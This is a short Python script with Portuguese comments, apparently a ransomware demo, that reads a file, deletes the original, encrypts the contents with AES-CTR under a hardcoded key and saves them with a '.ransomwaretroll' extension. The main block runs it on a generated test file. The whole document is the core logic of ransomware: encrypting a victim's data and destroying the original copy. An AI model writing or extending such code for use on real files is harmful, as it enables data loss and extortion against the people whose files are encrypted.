import os
import pyaes

def encrypt_file(file_name, key):
    try:
        # Verificar se o arquivo existe
        if not os.path.exists(file_name):
            raise FileNotFoundError(f"Arquivo {file_name} não encontrado.")

        # Ler os dados do arquivo
        with open(file_name, "rb") as file:
            file_data = file.read()

        # Remover o arquivo original
        os.remove(file_name)

        # Configurar a criptografia AES
        aes = pyaes.AESModeOfOperationCTR(key)

        # Criptografar os dados do arquivo
        crypto_data = aes.encrypt(file_data)

        # Criar um novo arquivo com os dados criptografados
        new_file_name = file_name + ".ransomwaretroll"
        with open(new_file_name, "wb") as new_file:
            new_file.write(crypto_data)

        print(f"Arquivo criptografado criado: {new_file_name}")
    except Exception as e:
        print(f"Ocorreu um erro durante a criptografia: {e}")

if __name__ == "__main__":
    # Definir a chave para a criptografia
    key = b"testeransomwares"

    # Nome do arquivo a ser criptografado
    file_name = "teste.txt"

    # Criar um arquivo de teste
    with open(file_name, "w") as file:
        file.write("Este é um arquivo de teste para criptografia.")

    # Chamar a função de criptografia
    encrypt_file(file_name, key)
